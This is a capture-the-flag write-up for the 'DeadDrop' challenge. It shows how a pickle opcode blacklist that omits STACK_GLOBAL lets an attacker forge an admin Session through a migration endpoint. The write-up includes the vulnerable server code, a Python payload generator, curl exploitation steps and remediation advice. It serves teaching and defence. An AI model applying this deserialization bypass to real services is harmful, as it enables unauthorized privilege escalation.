# DeadDrop — Pickle Opcode Blacklist Bypass Leading to Privilege Escalation

**Challenge:** DeadDrop Combined API
**Category:** Web Exploitation / Insecure Deserialization
**Target:** `http://cyberleague-shared-alb-586365318.ap-southeast-1.elb.amazonaws.com:30101/`
**Impact:** Unauthenticated attacker → forged admin session → full flag disclosure

---

## Summary

DeadDrop is a FastAPI-based P2P relay service that exchanges Python `pickle`
objects between the client and server over two endpoints: `POST /api/migrate`
and the `drop` WebSocket message. Both accept a base64-encoded pickle blob from
the client and deserialize it server-side using a custom `RestrictedUnpickler`.

That unpickler defends against arbitrary code execution by blacklisting the
`GLOBAL` and `INST` opcodes — the two mechanisms pickle historically uses to
import a class before instantiating it. This defense is incomplete: pickle
protocol 4 introduced a third opcode, `STACK_GLOBAL`, which performs the exact
same import operation through the exact same `Unpickler.find_class()` hook,
but is absent from the blacklist.

By serializing a malicious payload at protocol 4 instead of the pickle module's
default, an attacker can construct an arbitrary instance of any class in the
server's module allow-list — including its own `Session` class — with
attacker-chosen field values. Setting `role="admin"` on a forged `Session` and
submitting it to the migration endpoint causes the server to mint a real,
tracked, admin-privileged session token, bypassing authentication entirely.

---

## Vulnerable Code

From `source/main.py`:

```python
BLOCKED_OPCODES = frozenset({"GLOBAL", "INST"})

def _scan_opcodes(data: bytes) -> None:
    for opcode, arg, pos in pickletools.genops(data):
        if opcode.name in BLOCKED_OPCODES:
            raise pickle.UnpicklingError(
                f"Opcode {opcode.name} is not permitted in manifest data"
            )

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_MODULES = frozenset({"main", "datetime"})
    BLOCKED_BUILTINS = frozenset({
        "eval", "exec", "compile", "__import__", "execfile",
        "open", "input", "breakpoint", "exit", "quit",
        "globals", "locals", "vars", "dir",
        "delattr", "setattr", "getattr",
    })

    def find_class(self, module: str, name: str) -> Any:
        if module not in self.ALLOWED_MODULES:
            raise pickle.UnpicklingError(f"Import of {module}.{name} is not allowed")
        if name.startswith("_"):
            raise pickle.UnpicklingError(f"Import of {module}.{name} is not allowed")
        if module == "builtins" and name in self.BLOCKED_BUILTINS:
            raise pickle.UnpicklingError(f"Import of builtins.{name} is not allowed")
        return super().find_class(module, name)
```

The design intent is clear: only permit construction of objects from `main`
(the app's own module, e.g. `Session`, `DropManifest`) and `datetime`, and
block dangerous builtins outright. On its face, this looks like a reasonable
mitigation for CVE-style pickle RCE.

The migration handler then trusts whatever object type comes out:

```python
try:
    obj = _deserialize_manifest(raw)   # -> RestrictedUnpickler(...).load()
except ...

if not isinstance(obj, Session):
    raise HTTPException(400, "Expected a Session object for migration")

_validate_migrated_session(obj)   # format checks only, see below

new_token = "dd-" + secrets.token_hex(16)
migrated = Session(username=obj.username, role=obj.role)   # role copied verbatim
migrated.token = new_token
SESSIONS[new_token] = migrated
```

## Root Cause

Pickle opcode blacklisting is inherently fragile because multiple opcodes can
achieve the same semantic effect, and a filter that lists opcodes by name will
only ever cover the ones its author thought of.

| Protocol | Opcode for "import module.name" | In `BLOCKED_OPCODES`? |
|---|---|---|
| 0–3 | `GLOBAL` | Yes |
| ≥4 | `STACK_GLOBAL` | **No** |

Both opcodes ultimately call `Unpickler.find_class(module, name)` — the same
hook `RestrictedUnpickler` overrides. The override's logic is sound; the
problem is that `_scan_opcodes()` never gets the chance to reject the payload
before `find_class` runs, because it's scanning for an opcode name that simply
isn't present when the payload is built at protocol 4.

Concretely, serializing the same object at different protocols produces
different opcodes:

```python
pickle.dumps(obj, protocol=2)   # emits GLOBAL      -> blocked
pickle.dumps(obj, protocol=4)   # emits STACK_GLOBAL -> not blocked
```

Since `Session` genuinely lives in the allow-listed `main` module and its name
doesn't start with `_`, `find_class("main", "Session")` succeeds. Pickle's
`NEWOBJ` and `BUILD` opcodes then construct the instance and populate its
`__dict__` with entirely attacker-controlled values — including `role`.

### The secondary validation is insufficient

```python
def _validate_migrated_session(obj: Session) -> None:
    if obj.created_at is None:
        raise ValueError("Missing created_at timestamp")
    ts = obj.created_at
    drift = abs(int(time.time()) - ts)
    if drift > 120:
        raise ValueError(f"Session timestamp out of range ({drift}s drift, max 120s)")
    if not isinstance(obj.token, str) or not obj.token.startswith("dd-"):
        raise ValueError("Invalid token format: must start with 'dd-'")
```

This checks that `created_at` is a plausible recent timestamp and that `token`
matches a cosmetic prefix. It never cross-references `SESSIONS`, never
validates `username`, and — critically — never inspects `role` at all. All
four fields are attacker-supplied, so satisfying this check requires nothing
beyond setting a current timestamp and a `"dd-"`-prefixed string.

Because the migration endpoint copies `obj.role` directly into a new,
server-issued session (`Session(username=obj.username, role=obj.role)`), the
forged `role="admin"` value survives into a legitimate, trackable admin
session — which is all `GET /api/flag` checks for.

---

## Exploitation Steps

**1. Obtain a session token** (the migration endpoint requires *some*
authenticated session, and `/api/join` is unauthenticated and free):

```bash
curl -s -X POST "$TARGET/api/join"
```

**2. Forge a malicious `Session` pickle at protocol 4.**

`main.py` (defines the class in a module that must genuinely be named `main`):

```python
class Session:
    def __init__(self, username, role="user"):
        self.username = username
        self.role = role
        self.created_at = None
        self.token = None
```

`gen_payload.py` (imports `main.py` rather than redefining the class inline —
this matters, because pickle records the *actual* module a class was loaded
from, not a manually-set `__module__` string):

```python
import pickle, base64, time
import main

s = main.Session.__new__(main.Session)
s.username = "shadow"
s.role = "admin"
s.created_at = int(time.time())
s.token = "dd-" + "a" * 32

print(base64.b64encode(pickle.dumps(s, protocol=4)).decode())
```

**3. Submit the payload for migration:**

```bash
curl -s -X POST "$TARGET/api/migrate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"session_data\": \"$PAYLOAD\"}"
```

The response contains a freshly minted, server-tracked token with
`"role": "admin"`.

**4. Retrieve the flag:**

```bash
curl -s "$TARGET/api/flag" -H "Authorization: Bearer $ADMIN_TOKEN"
```

The identical payload also succeeds via the WebSocket `drop` message type
(`type: "session_migrated"` branch in `_handle_drop`), for deployments that
only expose `/ws`.

---

## Proof of Concept

See [`exploit.py`](./exploit.py) and its companion [`main.py`](./main.py) in
this repository. `main.py` must be imported, not executed directly, so that
pickle serializes a reference to a real `main.Session` rather than
`__main__.Session`.

```bash
python3 exploit.py
```

Expected output:

```
[+] joined: {'handle': '...', 'token': 'dd-...', 'role': 'user', ...}
[+] migrate response: {'username': 'shadow', 'role': 'admin', 'token': 'dd-...', 'message': 'Session migrated successfully'}
[+] FLAG: {'flag': 'CYBERLEAGUE{...}'}
```

---

## Remediation

1. **Avoid `pickle` for untrusted input entirely.** JSON has no equivalent to
   `find_class`, `GLOBAL`, or `STACK_GLOBAL` — there is no import primitive to
   defend at all. Redesign the manifest/session-migration protocol around
   plain JSON payloads with explicit field validation.

2. **If pickle must be used, whitelist opcodes rather than blacklisting them.**
   Restrict deserialization to the small, closed set of opcodes needed for
   plain data structures (e.g. `SHORT_BINUNICODE`, `BININT`, `EMPTY_DICT`,
   `MARK`, `SETITEMS`, `STOP`) and reject everything else outright, including
   both `GLOBAL` and `STACK_GLOBAL` and any opcode that reaches `find_class`.

3. **Never let deserialized input set security-sensitive fields directly.**
   Even with `find_class` correctly locked down to `main.Session`, the
   migration handler should not trust `obj.role`. A migrated session should
   always be issued with `role="user"` unconditionally; role elevation should
   require a separate, explicitly authorized code path.
